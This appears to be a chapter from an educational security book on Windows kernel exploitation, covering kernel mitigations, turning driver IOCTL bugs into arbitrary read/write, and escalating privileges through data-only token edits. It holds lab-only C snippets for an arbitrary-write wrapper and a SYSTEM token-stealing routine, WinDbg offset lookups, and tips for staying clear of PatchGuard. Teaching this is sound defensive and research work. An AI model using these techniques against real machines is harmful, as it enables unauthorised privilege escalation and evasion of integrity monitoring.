# Part 4 – Kernel Exploitation Primer

**What this chapter covers**

* The shape of modern Windows kernel bugs, primitives, and post-bug objectives
* How mitigations (KASLR, SMEP/SMAP, KPTI, PatchGuard, VBS/HVCI) reshape kernel exploit design
* Practical paths from an IOCTL bug to a stable arbitrary read/write and privilege escalation
* Memory layout you must internalize: pools, EPROCESS, tokens, callbacks, and what is safe to touch
* Debugging and triage habits that separate “instant bugcheck” from reliable exploitation

## Core concepts

### Two-minute mental model

User mode can’t directly touch kernel memory; it asks via **syscalls**. A vulnerable kernel component (usually a driver) exposes **IOCTL**s or other system-call-adjacent entry points that consume attacker-controlled buffers. A kernel bug that yields **arbitrary read/write** (AR/ AW), **type confusion**, or a **use-after-free** is your on-ramp. Your goals are modest and specific:

1. **Stabilize a primitive** (deterministic AR/AW).
2. **Avoid execution from user pages** (SMEP) and avoid long-lived code patches (PatchGuard).
3. **Escalate** by manipulating **data-only** security state (tokens, privileges, handles).
4. **Exit cleanly** without tripping integrity monitors.

Instead of “kernel shellcode” running from user memory, modern exploits prefer **data-only attacks** with brief **ROP** or **legitimate API** calls.

---

### The kernel memory you actually touch

Windows allocates from several pools; you mostly interact with:

* **Nonpaged pool**: always resident, used by IRQL>PASSIVE code paths; your fake objects often live here.
* **Paged pool**: pageable, safer for lab; many drivers allocate request contexts here.
* **Session pool / Win32k**: GUI subsystem state (less central since win32k lockdown but still relevant).
* **System PTEs and special mappings**: Mm-managed regions you rarely touch directly unless the bug grants you page tables.

You model bugs as **object lifetime** (UAF), **bounds (OOB)**, or **type confusion**—exactly the same mindset as user mode, but the blast radius is bigger.

---

### Mitigations that matter

* **KASLR** randomizes `ntoskrnl.exe` and driver bases. You often need a **base leak** (more below) to compute addresses.
* **SMEP/SMAP** prevent kernel from executing (and on some platforms, even reading) **user-mode pages** at CPL0. Don’t plan to jump to user shellcode.
* **KPTI** splits kernel/user mappings; some historic gadget flows broke; modern plans rely on **in-kernel** code only.
* **PatchGuard (KPP)** periodically checks critical code/data (IDT/GDT, MSRs, system service tables, many callback tables). Avoid persistent patches; prefer **data-only, transient** changes (tokens, access masks).
* **VBS/HVCI** enforces driver signing and integrity checks, makes code injection in kernel brittle, and complicates ROP with **CET** on supported systems.
* **Pool cookies / safe unlinking** significantly reduce classic pool metadata attacks; target **object fields** instead.

**Exploit shape in 2025**: brief ROP in kernel (from driver gadgets) to legitimate helpers, then **data-only elevation** (token edit), then normal return.

---

### From IOCTL bug to primitive

Most Windows kernel exploits begin with a **device**:

```c
// Lab-only user-mode trigger outline (x64)
#include <windows.h>
#include <stdio.h>

int wmain() {
    HANDLE h = CreateFileW(L"\\\\.\\VulnDrv", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { wprintf(L"open failed\n"); return 1; }

    BYTE in[0x200] = {0};   // craft according to the IOCTL contract
    DWORD bytes = 0;
    // IOCTL code known from reversing or headers
    DeviceIoControl(h, 0x222003 /*IOCTL_VULN_ARBITRARY_WRITE*/, in, sizeof(in), NULL, 0, &bytes, NULL);
    CloseHandle(h);
    return 0;
}
```

You reverse the handler to understand how user buffers flow into kernel. Aim to turn a logic bug into **stable AR/AW**:

* **Arbitrary write**: data + kernel address argument; often bounded to “small” writes (e.g., 8 bytes)—good enough for **token** edits or pointer swaps.
* **Arbitrary read**: symmetric path, or derived from corrupting a pointer used in a later copy-out.

When the bug is a **UAF**, you groom allocations (nonpaged/paged pool size classes) so a freed object is replaced by your **fake object** with a function pointer or a data field that yields AR/AW on use.

---

### Kernel ROP without user shellcode

With SMEP, executing from user pages will fault. Your options:

* **Pure data-only**: if AW gives you token control, you might avoid ROP entirely.
* **Short in-kernel ROP**: return into **driver** or **ntoskrnl** gadgets to call legitimate routines (e.g., `memcpy` equivalent, `PsReferencePrimaryToken`, `MmCopyVirtualMemory`) or to **probe and write** into protected fields with proper APIs.
* **Call-into-legit**: use an overwritten function pointer that points to a **real** kernel function (valid prologue, plays well with CFG/CET where applicable).

The less code you run, the longer you live before PatchGuard or stability issues intervene.

---

### Data-only escalation: tokens and privileges

The durable, PatchGuard-safe post-bug step is **token manipulation**:

* Each process has an **`EPROCESS.Token`** (actually a pointer with low bits used as a **reference/privilege** tag).
* Strategy A (classic): find **SYSTEM** process’s token and copy its pointer into **current** process’s `Token`.
* Strategy B (quieter): edit **`_SEP_TOKEN_PRIVILEGES`** to set **`SeDebugPrivilege`** (Present/Enabled/EnabledByDefault) and/or mark **Integrity** high; then perform user-mode steps to duplicate or assign.
* Strategy C (handle table trick): alter **OBJECT\_HEADER** security or your process’s **handle table** to grant powerful access to `\Device\PhysicalMemory`/LSA secrets/etc.—increasingly noisy.

**Why tokens?** Tokens are data objects; PatchGuard does not guard them. The change is local to the process and resets on restart.

---

### Finding kernel/driver bases (leaks)

To compute offsets or gadget addresses you need a base:

* **NtQuerySystemInformation(SystemModuleInformation)** historically leaked module bases; modern builds often restrict or mangle it for low-priv contexts.
* **Handle table or info leak in the target driver**: many bugs spill kernel pointers in IOCTL outputs or events.
* **ETW/kernel debugging** in the lab: acceptable for development; not an attack primitive.

A **single base** (e.g., driver you exploit) suffices for ROP gadgets; token offsets should be derived from **symbols per product build** in the lab, then **pattern-searched** at runtime if you need portability.

---

### WinDbg triage loop (what to look at)

```text
# KD/WinDbg (x64) snippets during crash triage
!analyze -v
!drvobj VulnDrv 2                ; confirm we're in the right driver
!thread                          ; IRQL, owning process
r                                ; registers; confirm control reaches your path
!pool 0xffff9c0c`12345678        ; inspect suspicious pool allocation
!process 0 1                     ; list processes (note SYSTEM/EPROCESS)
dt nt!_EPROCESS 0xffffb50a`ABC... ; confirm offsets for Token, UniqueProcessId, ActiveProcessLinks
lm k                             ; kernel modules and bases
```

You want **first-fault** fidelity (don’t miss the real bug by crashing later). If the crash is due to SMEP or PatchGuard, you’re past the bug and into a bad post-bug plan.

---

## Example-first: from AW to SYSTEM in the lab

### 1) Build a minimal AW primitive

Assume the IOCTL lets you write 8 bytes to an **arbitrary kernel address**. Wrap it:

```c
// User-mode helper around the IOCTL primitive (lab-only)
BOOL kwrite8(HANDLE hDev, ULONGLONG kaddr, ULONGLONG value) {
    struct { ULONGLONG where; ULONGLONG what; } in = { kaddr, value };
    DWORD ret=0;
    return DeviceIoControl(hDev, 0x222003, &in, sizeof(in), NULL, 0, &ret, NULL);
}
```

### 2) Locate SYSTEM’s token and current EPROCESS

In the lab, rely on symbols to confirm offsets; in a “portable” exploit you pattern-search fields.

```text
# KD (local kernel debugging)
> !process 0 1
   PROCESS ffffae0a`5c5d9080  SessionId: none  Cid: 0004    SYSTEM ...
> dt nt!_EPROCESS ffffae0a`5c5d9080 Token UniqueProcessId ActiveProcessLinks
   +0x4b8 Token : _EX_FAST_REF
   +0x440 UniqueProcessId : Ptr64 Void
   +0x448 ActiveProcessLinks : _LIST_ENTRY
```

Suppose `Token` offset is `0x4b8` on this build. Find your process’s EPROCESS similarly (`!process 0 1`, match the `Cid` to your PID).

### 3) Copy the token pointer (low-bit masking!)

Tokens are stored with low **reference bits**—you must **preserve** those low bits when copying. Typically, mask out the low 4 bits when reading and keep the destination’s low bits when writing.

```c
// Lab-only elevation using AW write
BOOL steal_token(HANDLE hDev, ULONG64 eprocess_sys, ULONG64 eprocess_me) {
    ULONG64 token_sys = 0, token_me = 0;
    // Use companion arbitrary READ or derive from a field copy; if READ is missing,
    // find another plan (e.g., duplicate handle path). For illustration assume we have kread8.
    kread8(hDev, eprocess_sys + 0x4b8, &token_sys);
    kread8(hDev, eprocess_me  + 0x4b8, &token_me);

    ULONG64 new_token = (token_sys & ~0xF) | (token_me & 0xF);
    return kwrite8(hDev, eprocess_me + 0x4b8, new_token);
}
```

If your primitive is **write-only**, you can scan **ActiveProcessLinks** for PID 4 by walking the list with reads via the same IOCTL (many bugs allow both). In the “write-only” worst case, escalate via **SEP\_TOKEN\_PRIVILEGES** bits in the current token (set **SeDebugPrivilege** `Present/Enabled/EnabledByDefault`), which you can guess from structure layout and constant bit positions.

### 4) Prove it quietly

Don’t spawn `cmd.exe` from kernel. Return to user mode and **open a PPL-protected** or admin-only target (e.g., **LSA secrets read** will still be blocked by PPL, but opening a **system process handle** with all access is a quick proof).

```c
HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4); // SYSTEM process itself
printf("OpenProcess SYSTEM: %s\n", hp ? "OK" : "FAIL");
```

If you can now open PID 4 with full access as a regular user, your token change worked.

---

## Why this matters for exploitation / anti-exploit / malware analysis

Kernel bugs remain among the **highest-impact** issues on Windows because they shortcut user-mode defenses (PPL, EDR tamper resistance, token restrictions). But modern mitigations mean a “kernel exploit” is mostly **disciplined data tampering** and **short control transfers** within kernel code—not running user shellcode at ring 0. Attackers who internalize this ship **quieter**, **more portable** exploits; defenders who understand it focus telemetry on **IOCTL surfaces**, **token anomalies**, and **brief, suspicious kernel call sequences** instead of only user-mode hooking.

## APIs and functions

* `DeviceIoControl` — user-mode doorway to driver IOCTLs; the common exploit trigger.
* `NtQuerySystemInformation` (SystemModuleInformation) — module enumeration; often restricted, but invaluable in the lab for base addresses.
* `MiniDumpWriteDump` / WER LocalDumps — capture first-faults when developing triggers for vulnerable paths.
* `ExAllocatePool2` / `ExFreePool` (kernel) — target allocation routines in reversing; size classes matter for UAF/grooming.
* `MmCopyVirtualMemory` (kernel) — legitimate in-kernel copy primitive; certain exploits redirect function pointers here for AR/RW.
* `PsLookupProcessByProcessId` / `ObReferenceObjectByHandle` (kernel) — canonical helpers for resolving process objects; appear in exploitation ROP plans.
* `SeAssignPrimaryToken` / `PsReferencePrimaryToken` (kernel) — token-handling flows; understand them to avoid tripping PatchGuard.
* `IoCreateDriver` / `ZwLoadDriver` — not for attacks, but useful in lab scaffolding to load a benign test driver.

*(Pick the kernel-mode helpers relevant to your reversed target; these illustrate common names you’ll see in call graphs and ROP plans.)*

## Pitfalls, detection notes, and anti-analysis gotchas

* **SMEP/SMAP traps**: any attempt to execute from user pages in kernel will bugcheck; don’t plan “ring-0 shellcode” in user memory.
* **Token low bits**: forgetting to preserve token pointer low bits (reference/tag) yields instant bugcheck on next access.
* **PatchGuard landmines**: persistent code patches (SSDT, IDT, HAL tables, callback arrays) will crash minutes later; prefer **data-only** edits.
* **IRQL context**: some paths run at DISPATCH\_LEVEL; calling paged code or touching pageable memory there will bugcheck.
* **Pool type mismatch**: grooming with the wrong size or pool type ruins determinism; confirm with `!pool` and tags.
* **Optimistic “base leaks”**: relying on `SystemModuleInformation` in production is fragile; build alternative leaks from your target’s outputs.
* **Verifier/VBS**: Driver Verifier changes timing and memory layout; great for finding bugs but can hide exploitability paths—test both with and without.
* **PPL/LSASS expectations**: SYSTEM token ≠ carte blanche over Protected Processes; plan proofs that don’t rely on breaking PPL.

## Cross-references

* Virtual memory layout, VADs, and permission semantics in **Memory & Virtual Address Space** clarify why W→X in kernel is different than user mode.
* Handle tables, objects, and tokens are introduced in **Object Manager & Handles**; we rely on that to reason about `_EPROCESS`, tokens, and access masks.
* Syscall entry, parameter marshalling, and where your IOCTL lives relative to **Syscalls & the NTAPI Boundary** help when you triage the call stack.
* Kernel integrity controls (PatchGuard, VBS/HVCI) are detailed in **Trust & Integrity: Secure Boot, WDAC/App Control, Code Integrity, PatchGuard, VBS/HVCI, PPL**; this chapter assumes their constraints.
* When post-exploit you pivot to user-mode injection or APCs, see **Process Injection & Hooking** and **Scheduling, APCs & Callback Surfaces**.

## Glossary

* **KASLR**: randomization of kernel and driver base addresses.
* **SMEP/SMAP**: CPU features preventing kernel execution/access to user memory.
* **KPTI**: kernel page-table isolation to split user/kernel address spaces.
* **PatchGuard (KPP)**: periodic integrity checks over kernel code/data to detect unauthorized changes.
* **EPROCESS**: kernel structure representing a process; holds the `Token` and other security-relevant fields.
* **Token**: security descriptor (SID/privileges/integrity) used by access checks; swapping it yields elevation.
* **IOCTL**: I/O control request sent to drivers via `DeviceIoControl`.
* **Arbitrary read/write (AR/AW)**: ability to read/write kernel memory at chosen addresses.
* **Pool**: kernel heap (paged/nonpaged) backing objects and buffers.
* **VBS/HVCI**: virtualization-based security / hypervisor-enforced code integrity; hardens kernel code execution paths.

## Key takeaways

* Modern kernel exploits are **data-only first**: short, in-kernel control and token/privilege edits beat long shellcode paths.
* **Mitigations** reshape the plan: assume SMEP/KPTI/PG/VBS and design for **no user-mode execution** and **no persistent patches**.
* Stabilize an IOCTL bug into a **deterministic AR/AW**, then aim at **tokens**; preserve low bits and structure invariants.
* Keep triage disciplined: find **first faults**, respect IRQL/paging rules, and use WinDbg to confirm pool and structure assumptions.
* Your exploit ends well if it **returns cleanly** to user mode and proves elevation without noisy side effects.
